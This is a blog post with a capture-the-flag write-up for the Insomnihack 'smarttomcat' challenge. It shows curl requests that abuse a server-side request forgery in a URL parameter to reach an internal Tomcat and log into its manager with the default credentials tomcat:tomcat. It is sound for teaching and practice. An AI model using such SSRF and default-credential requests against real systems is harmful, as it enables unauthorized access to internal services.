---
layout: post
title:  "Write UP Insomnihack smarttomcat!"
date:   2017-01-23 16:50:00 +0100
categories: jekyll update
---

For this chall we were provided this internet page:
![smarttomcat]({{ site.url }}/assets/insomnihack/smarttomcat.png)

When we try to enter some coordinates, we can see that it's doing a *POST* request on *index.php* with *u="http://localhost:8080/index.jsp?x=32&y=23"* as parameter.

We then try to do the request with curl:

`curl -X POST  'http://smarttomcat.teaser.insomnihack.ch/index.php' --data-urlencode "u=http://localhost:8080/index.jsp?x=3&y=4"`

and we are rewarded a 

`Tomcat not found ! Try again`

So we try to change the url for the *u* paramter:

`curl -X POST  'http://smarttomcat.teaser.insomnihack.ch/index.php' --data-urlencode "u=http://localhost:8080/lol"`

`Apache Tomcat/7.0.68 (Ubuntu) - Error report : NOT FOUND`

Now that we know it's an Apache Tomcat, we can search for special files like manager/html:

`curl -X POST  'http://smarttomcat.teaser.insomnihack.ch/index.php' --data-urlencode "u=http://localhost:8080/manager/html"`

Answer:

`This request requires HTTP authentication.`


So we try to authenticate with default username and password:

`curl -X POST  'http://smarttomcat.teaser.insomnihack.ch/index.php' --data-urlencode "u=http://tomcat:tomcat@localhos
t:8080/manager/html"`

Answer:

`We won't give you the manager, but you can have the flag : INS{th1s_is_re4l_w0rld_pent3st}`

Here we have the flag !
